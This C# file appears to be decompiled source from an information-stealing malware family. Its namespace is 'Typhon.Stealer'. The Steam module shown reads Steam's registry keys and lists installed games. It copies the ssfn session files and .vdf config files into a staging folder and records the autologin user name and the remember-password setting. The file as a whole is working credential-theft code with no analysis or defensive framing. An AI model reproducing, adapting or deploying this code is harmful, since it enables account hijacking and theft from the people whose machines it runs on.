using System;
using System.IO;
using Microsoft.Win32;

namespace Typhon.Stealer.Software.Gaming
{
	// Token: 0x0200001F RID: 31
	internal class Steam
	{
		// Token: 0x06000083 RID: 131 RVA: 0x0000573C File Offset: 0x0000393C
		public static bool GetSteamSession(string sSavePath)
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
			if (registryKey == null)
			{
				return false;
			}
			string text = registryKey.GetValue("SteamPath").ToString();
			if (!Directory.Exists(text))
			{
				return false;
			}
			Directory.CreateDirectory(sSavePath);
			try
			{
				foreach (string text2 in registryKey.OpenSubKey("Apps").GetSubKeyNames())
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("Apps\\" + text2))
					{
						if (registryKey2 != null)
						{
							string text3 = (string)registryKey2.GetValue("Name");
							text3 = (string.IsNullOrEmpty(text3) ? "Unknown" : text3);
							string text4 = ((int)registryKey2.GetValue("Installed") == 1) ? "Yes" : "No";
							string text5 = ((int)registryKey2.GetValue("Running") == 1) ? "Yes" : "No";
							string text6 = ((int)registryKey2.GetValue("Updating") == 1) ? "Yes" : "No";
							File.AppendAllText(sSavePath + "\\Apps.txt", string.Concat(new string[]
							{
								"Application ",
								text3,
								"\n\tGameID: ",
								text2,
								"\n\tInstalled: ",
								text4,
								"\n\tRunning: ",
								text5,
								"\n\tUpdating: ",
								text6,
								"\n\n"
							}));
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(sSavePath + "\\ssnf");
					foreach (string text7 in Directory.GetFiles(text))
					{
						if (text7.Contains("ssfn"))
						{
							File.Copy(text7, sSavePath + "\\ssnf\\" + Path.GetFileName(text7));
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				string path = Path.Combine(text, "config");
				if (Directory.Exists(path))
				{
					Directory.CreateDirectory(sSavePath + "\\configs");
					foreach (string text8 in Directory.GetFiles(path))
					{
						if (text8.EndsWith("vdf"))
						{
							File.Copy(text8, sSavePath + "\\configs\\" + Path.GetFileName(text8));
						}
					}
				}
			}
			catch
			{
			}
			try
			{
				string str = ((int)registryKey.GetValue("RememberPassword") == 1) ? "Yes" : "No";
				string str2 = "Autologin User: ";
				object value = registryKey.GetValue("AutoLoginUser");
				string contents = string.Format(str2 + ((value != null) ? value.ToString() : null) + "\nRemember password: " + str, new object[0]);
				File.WriteAllText(sSavePath + "\\SteamInfo.txt", contents);
			}
			catch
			{
			}
			return true;
		}
	}
}
